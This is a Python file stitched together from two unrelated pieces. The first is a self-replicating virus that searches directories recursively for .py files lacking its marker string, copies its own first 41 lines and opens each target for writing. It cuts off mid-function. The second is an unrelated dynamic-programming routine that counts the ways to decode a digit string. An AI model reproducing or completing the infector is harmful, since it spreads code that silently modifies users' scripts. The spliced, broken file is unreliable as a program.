#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
mod = 1e9 + 7
 
# function which returns the number of ways to decode the message
def decodeMessage(dp, s, str, n):
   
    # an empty string can also form 1 valid decoding
    if(s >= n):
        return 1
 
        # if we have already computed the number of
        # ways to decode the substring return the
        # answer directly
 
    if(dp[s] != -1):
        return dp[s]
     
    num = 0
    tc = 0
    for i in range(s,n):
        # generate the number
        num = num*10 + (ord(str[i]) - ord('0'))
 
        # validate the number
        if(num >= 1 and num <= 26):
             
                # since the number of ways to decode any string
                # depends on the result of
                # how the remaining string is decoded so get the
                # number of ways how the rest of the string can
                # be decoded
            c = decodeMessage(dp, i + 1, str, n)
 
            # add all the ways that the substring
            # from the current index can be decoded
            tc = int((tc%mod + c%mod)%mod)
 
        # leading 0’s or the number
        # generated so far is greater than 26
        # we can just stop the process
        # as it can never be a part of our solution
        else:
            break
 
    # store all the possible decodings and return the result
    dp[s] = tc
    return dp[s]
 
def CountWays(str):
 
    n = len(str)
 
    # empty string can form 1 valid decoding
    if(n == 0):
        return 1
 
    # dp vector to store the  number of ways
    # to decode each and every substring
    dp = [-1]*(n)
 
    # return the result
    return decodeMessage(dp, 0, str, n)
   
# driver code
if __name__ == "__main__" :
 
   str = "1234"
   print(CountWays(str))
 
  # This code is contributed by shinjanpatra.